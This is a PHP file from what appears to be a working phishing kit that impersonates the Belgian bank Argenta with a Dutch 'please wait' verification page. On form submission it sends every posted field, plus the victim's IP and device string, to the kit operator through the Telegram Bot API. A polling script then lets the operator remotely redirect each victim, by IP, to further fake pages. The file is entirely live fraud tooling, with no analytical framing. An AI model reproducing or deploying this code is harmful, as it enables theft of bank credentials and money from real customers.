<?php
session_start();
error_reporting(0);
include 'config.php';

function getUserIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) return $_SERVER["HTTP_CF_CONNECTING_IP"];
    if (isset($_SERVER["HTTP_CLIENT_IP"])) return $_SERVER["HTTP_CLIENT_IP"];
    if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) return explode(',', $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
    return $_SERVER['REMOTE_ADDR'];
}

$uip = getUserIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $type = $_POST['type'] ?? 'unknown';
    $message = "🔔 [ARGENTA] New Data: " . strtoupper($type) . "\n";
    $message .= "🌐 IP: " . $uip . "\n";
    
    foreach ($_POST as $key => $value) {
        if ($key != 'type' && $key != 'submit') {
            $message .= "🔹 " . ucfirst($key) . ": " . $value . "\n";
        }
    }
    $message .= "\n📱 Device: " . $user_agent;
    
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);
    file_get_contents($url);
    
    // Create user file for control panel
    if (!file_exists('users')) mkdir('users', 0777, true);
    file_put_contents('users/' . $uip . '.txt', '0');
    
    header("Location: verify.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Argenta | Verifiëren...</title>
    <link href="./Home/main.4393a533.css" rel="stylesheet">
    <script src="./nkl_files/jquery.min.js"></script>
</head>
<body style="background: #f4f4f4; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
    <div style="max-width: 400px; width: 90%; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center;">
        <div style="margin-bottom: 25px;">
            <div class="spinner" style="border: 3px solid #f3f3f3; border-top: 3px solid #004a99; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
        </div>
        <h3 style="color: #333; margin-bottom: 10px;">Een ogenblik geduld...</h3>
        <p style="color: #777; font-size: 15px; line-height: 1.5;">Wij verwerken uw aanvraag. Sluit dit venster niet.</p>
    </div>
    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
    <script>
    var ip = "<?php echo $uip; ?>";
    setInterval(function() {
        $.get('./users/' + ip + '.txt?rand=' + Math.random(), function(data) {
            if(data != '0' && data != '') {
                var row = data.split('#|#');
                if(row[0] == 'url') location.href = row[2];
                else location.href = "./nkl-" + row[0] + ".php?error=" + row[1];
            }
        });
    }, 2000);
    </script>
</body>
</html>
